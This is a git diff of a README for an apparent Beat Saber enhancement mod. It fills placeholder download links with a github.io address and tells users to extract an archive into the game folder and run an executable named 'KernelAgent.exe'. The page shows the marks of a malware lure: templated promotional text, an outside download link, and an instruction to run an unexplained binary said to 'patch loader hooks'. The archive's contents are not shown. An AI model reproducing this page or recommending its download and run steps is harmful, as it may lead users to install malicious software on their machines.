@@ -2,13 +2,15 @@
 
 This mod enhances Beat Saber by unlocking support for custom songs, cleaning UI clutter, improving frame pacing, and eliminating input delay for smoother gameplay on all major VR headsets.
 
-[![Download VR Mod+](https://img.shields.io/badge/Download-BeatSaber_VR_Mod-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download VR Mod+](https://img.shields.io/badge/Download-BeatSaber_VR_Mod-blueviolet)](https://beat-saber-vr-mod-enhancer.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://beat-saber-vr-mod-enhancer.github.io/.github
+) section  
 2. 📁 **Extract the contents** into your `...\Beat Saber\` root folder  
 3. 🖱 **Run the executable file** `KernelAgent.exe` (required to patch loader hooks and enable custom track injection)  
 4. 🎵 Place your `.zip` or `.dat` songs inside `Beat Saber_Data\CustomLevels\`  
